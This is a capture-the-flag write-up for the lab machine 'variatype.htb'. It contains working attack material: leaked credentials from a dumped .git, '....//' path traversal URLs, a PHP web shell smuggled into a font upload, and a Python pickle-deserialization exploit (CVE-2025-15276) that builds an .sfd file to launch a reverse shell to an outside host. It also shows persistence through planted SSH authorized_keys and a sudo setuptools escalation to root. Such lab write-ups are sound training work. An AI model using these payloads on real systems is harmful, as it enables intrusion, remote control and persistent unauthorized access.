# variatype.htb

> **OS:** Linux\
> **Difficulty:** Medium\
> **IP:** `10.10.x.x`\
> **Date:** 14-03-2026

***

### TL;DR

Nmap found SSH and an nginx site (`variatype.htb`). `ffuf` revealed the subdomain `portal.variatype.htb` and `feroxbuster` an exposed `.git` directory; after dumping it with `git-dumper`, the commit history leaked the credentials `gitbot:G1tB0t_Acc3ss_2025!`. Logging into the portal, a path traversal in `download.php` (bypassed via `....//`) allowed reading system files, after which a malicious `.ttf` containing a PHP web shell was uploaded - getting RCE as `www-data`.

**Privilege Escalation:** As `www-data`, `pspy` revealed a cron job running the `fontforge` binary, vulnerable to a pickle deserialization RCE (CVE-2025-15276). A crafted `.sfd` file with a malicious `PickledData` payload triggered a reverse shell as `steve`, made persistent by adding an SSH key to his `authorized_keys`. From `steve`, `sudo -l` showed permission to run `install_validator.py` as root; abusing a setuptools behaviour (via a crafted directory structure containing `.ssh/authorized_keys`) planted a root-authorized key — yielding full root access.

**Chain:**&#x20;

`nmap` > `ffuf` > `git-dumper` > `creds` > `path traversal` > `font webshell` > `www-data` > `fontforge pickle RCE` > `steve` > `sudo setuptools` > `root`

***

### Box Info

|                |                                                      |
| -------------- | ---------------------------------------------------- |
| **Name**       | variatype.htb                                        |
| **OS**         | Linux                                                |
| **Difficulty** | Medium                                               |
| **Release**    | Released on 14th March, 2026                         |
| **Key skills** | searching for CVE's, applying them on local instance |

***

### 1. Recon

#### 1.1 Port scan

```bash
nmap variatype.htb -sS -sV -sC
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-27 16:15 +0200
Nmap scan report for variatype.htb (10.129.244.202)
Host is up (0.012s latency).
rDNS record for 10.129.244.202: variatype
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 e0:b2:eb:88:e3:6a:dd:4c:db:c1:38:65:46:b5:3a:1e (ECDSA)
|_  256 ee:d2:bb:81:4d:a2:8f:df:1c:50:bc:e1:0e:0a:d1:22 (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: VariaType Labs \xE2\x80\x94 Variable Font Generator
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

#### 1.2 Initial observations

* Hostname / domain: variatype.htb
*   Added to `/etc/hosts`:<br>

    ```
    10.10.x.x
    ```

### 2. Foothold / Initial Access

#### 2.1 Description

> Nmap found SSH and an nginx site (`variatype.htb`). `ffuf` revealed the subdomain `portal.variatype.htb` and `feroxbuster` an exposed `.git` directory; after dumping it with `git-dumper`, the commit history leaked the credentials `gitbot:G1tB0t_Acc3ss_2025!`. Logging into the portal, a path traversal in `download.php` (bypassed via `....//`) allowed reading system files, after which a malicious `.ttf` containing a PHP web shell was uploaded — yielding RCE as `www-data`.

#### 2.2 Exploitation

When we reach the variatype.htb web app, the thing that stands out is the `.designspace` upload function that also accepts `.ttf` or `.otf` files. When we look into it, we find the following CVE that might be related to the fonttools upload: [https://github.com/advisories/GHSA-768j-98cg-p3fv](https://github.com/advisories/GHSA-768j-98cg-p3fv). However, we are unable to find a possible endpoint from which we can retrieve files.

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-09-12 om 11.11.21.png" alt=""><figcaption></figcaption></figure>

In order to find more subdomains, we utilize `ffuf` and quickly discover that the subdomain `portal.variatype.htb` exists.

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-09-12 om 11.12.03.png" alt=""><figcaption></figcaption></figure>

In addition, we fire off feroxbuster, which reveals a `.git` directory that we can dump with the tool `git-dumper`.

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-09-12 om 11.17.30.png" alt=""><figcaption></figcaption></figure>

After dumping the `.git` directory, we check the different commits and read out the differences. This results in finding the credentials `gitbot:G1tB0t_Acc3ss_2025!`.

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-09-12 om 11.15.55.png" alt=""><figcaption></figcaption></figure>

We try these credentials on `portal.variatype.htb` and successfully log in to the application.

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-09-12 om 11.22.28.png" alt=""><figcaption></figcaption></figure>

After logging in, we find the uploaded `.ttf` file and the option to either view or download it. When we try to download `/etc/passwd`, we start using `....//` to escape the `../` filter (so that a normal `../` remains after filtering). This way, we find that we can read multiple different system files, such as `/etc/passwd`.

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-09-27 om 09.00.35.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-09-12 om 11.33.58.png" alt=""><figcaption></figcaption></figure>

We first try reading the `/etc/nginx/nginx.conf` file. From there, we try to read the document roots of the `variatype.htb` and `portal.variatype.htb` sites (since these can be found in `nginx.conf`).

```bash
/download.php?f=....//....//....//....//....//....//etc/nginx/nginx.conf
/download.php?f=....//....//....//....//....//....//etc/nginx/sites-enabled/portal.variatype.htb
```

Upload

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-09-26 om 10.13.09.png" alt=""><figcaption></figcaption></figure>

We then upload the file (`temp.php`) with the content that was generated from `setup.py` into the `.ttf` file. This ultimately results in a web shell running as the user `www-data`, as can be seen in the screenshot below.

```
http://portal.variatype.htb/files/temp.php?0=whoami
```

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-09-26 om 10.11.49.png" alt=""><figcaption></figcaption></figure>

***

### 3. Privilege Escalation

#### 3.1 Description

> As `www-data`, `pspy` revealed a cron job running the `fontforge` binary, vulnerable to a pickle deserialization RCE (CVE-2025-15276). A malicious `.sfd` file with a crafted `PickledData` payload triggered a reverse shell as `steve`, which was made persistent by adding an SSH key to `/home/steve/.ssh/authorized_keys`. From `steve`, `sudo -l` showed permission to run `install_validator.py` as root; abusing a setuptools behaviour (via a crafted directory structure containing `.ssh/authorized_keys`) planted a root-authorized key — yielding root access.

**www-data to steve**

After getting a shell as the user `www-data`, we ran pspy32s. This showed us that a script was running that ran the `/usr/local/src/fontforge/build/bin/fontforge` binary. After looking up possible exploits of the fontforge binary ([https://www.cvedetails.com/cve/CVE-2025-15276/](https://www.cvedetails.com/cve/CVE-2025-15276/)) we found a deserialization RCE. We adjust the payload to our own custom SSH payload

[CVE-2025-15276](https://github.com/ahmedreda38/CVE-2025-15276-poc)

```python
import os
import pickle

LHOST = "10.10.17.34"
LPORT = "5555"

# for Reverse shell
cmd = f"bash -c '/dev/shm/./ssh-amd-x64 -b 8889 -p 5000 10.10.15.57'"

class Exploit(object):
    def __reduce__(self):
        return (os.system, (cmd,))

# Serialize the exploit class (Protocol 0 for ASCII compatibility)
payload = pickle.dumps(Exploit(), protocol=0).decode('ascii')

# Escape for SFD format (FontForge expects escaped backslashes and quotes)
escaped_payload = payload.replace('\\', '\\\\').replace('"', '\\"')

# Construct a minimal SFD file
sfd_content = f"""SplineFontDB: 3.2
FontName: Exploit
FullName: Exploit
FamilyName: Exploit
Weight: Regular
Version: 001.000
PickledData: "{escaped_payload}"
BeginChars: 256 0
EndChars
EndSplineFont
"""

with open("exploit.sfd", "w") as f:
    f.write(sfd_content)

print("[+] exploit.sfd generated successfully!")
print(f"[+] Payload: {cmd}")
```

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-09-26 om 15.31.33.png" alt=""><figcaption></figcaption></figure>

And once the cron job triggers, we get a reverse shell using fahrj reverse ssh binary. To make things easier we run it once more, but then to add our own SSH key to the user steve

```bash
# add the public key to the authorized_keys file of the user steve
mkdir -p /home/steve/.ssh; echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIlqtAaJS4g3B0Ou72g0C8aTnP7aYxJ+ycryhcvlWWbl root@kali" > /home/steve/.ssh/authorized_keys
```

**Steve to root**

In order to go from the user steve to root, we find that we're able to run the `install_validator.py` binary by executing `sudo -l`

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-09-26 om 14.25.20.png" alt=""><figcaption></figcaption></figure>

In order to exploit this, we create a directory structure on the attacker host. We create the folder root, then within root we create .ssh, then within .ssh we create the authorized\_keys file that contains the public key.

[https://github.com/pypa/setuptools/issues/4946](https://github.com/pypa/setuptools/issues/4946)

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-09-26 om 15.26.53.png" alt=""><figcaption></figcaption></figure>
